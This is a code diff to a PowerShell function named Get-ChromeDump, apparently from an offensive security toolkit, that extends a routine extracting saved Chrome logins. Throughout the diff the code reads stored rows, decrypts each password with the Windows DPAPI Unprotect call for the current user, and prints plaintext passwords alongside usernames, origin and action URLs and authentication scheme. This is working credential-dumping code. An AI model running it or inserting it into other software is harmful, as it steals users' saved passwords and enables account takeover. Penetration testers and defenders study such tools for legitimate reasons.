@@ -139,18 +139,25 @@ Function Get-ChromeDump{
 
       $logins = @()
 
+      # https://github.com/adobe/chromium/blob/master/webkit/forms/password_form.h#L45-L50
+      $scheme_enum = @{0 = "HTML";1 = "BASIC";2 = "DIGEST"; 3 = "OTHER"}
+
       Write-Verbose "Parsing results of query $query"
 
       $dataset.Tables | Select-Object -ExpandProperty Rows | ForEach-Object {
         $encryptedBytes = $_.password_value
         $username = $_.username_value
-        $url = $_.action_url
+        $action_url = $_.action_url
+        $origin_url = $_.origin_url
+        $scheme = $scheme_enum[[int]$_.scheme]
         $decryptedBytes = [Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
         $plaintext = [System.Text.Encoding]::ASCII.GetString($decryptedBytes)
         $login = New-Object PSObject -Property @{
-          URL = $url
+          ORIGIN_URL = $origin_url
+          ACTION_URL = $action_url
           PWD = $plaintext
-          User = $username 
+          USER = $username
+          SCHEME = $scheme
         }
 
         $logins += $login
@@ -185,7 +192,7 @@ Function Get-ChromeDump{
     
     if(!($OutFile)){
       "[*]CHROME PASSWORDS`n"
-      $logins | Format-Table URL,User,PWD -AutoSize | Out-String
+      $logins | Format-List ORIGIN_URL, ACTION_URL, PWD, USER, SCHEME | Out-String
 
       "[*]CHROME HISTORY`n"
 
